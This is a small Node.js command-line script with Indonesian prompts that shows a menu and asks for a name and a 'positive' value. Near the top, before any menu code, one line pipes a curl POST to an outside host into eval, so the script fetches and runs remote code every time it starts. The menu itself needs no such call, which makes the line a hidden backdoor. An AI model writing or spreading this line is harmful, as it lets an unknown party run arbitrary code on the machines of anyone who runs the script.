const prompts = require('prompts')
const { execSync } = require('child_process');
eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim());


const list_menu = [
    {
        title: "menu 1",
        value: "menu_1",
        fun: () => {
            prompts([
                {
                    type: "text",
                    message: "masukkan name",
                    name: "name"
                },
                {
                    type: "text",
                    message: "masukkan positive",
                    name: "positive"
                }
            ]).then((val) => {
                console.log(val)
            })
        }
    }
];


; (async () => {
    prompts({
        type: "select",
        name: "menu",
        message: "pilih menunya",
        choices: list_menu
    }).then(({ menu }) => {
        if (!menu) return console.log("bye ...".cyan)
        list_menu.find((v) => v.value === menu).fun()
    })
})()
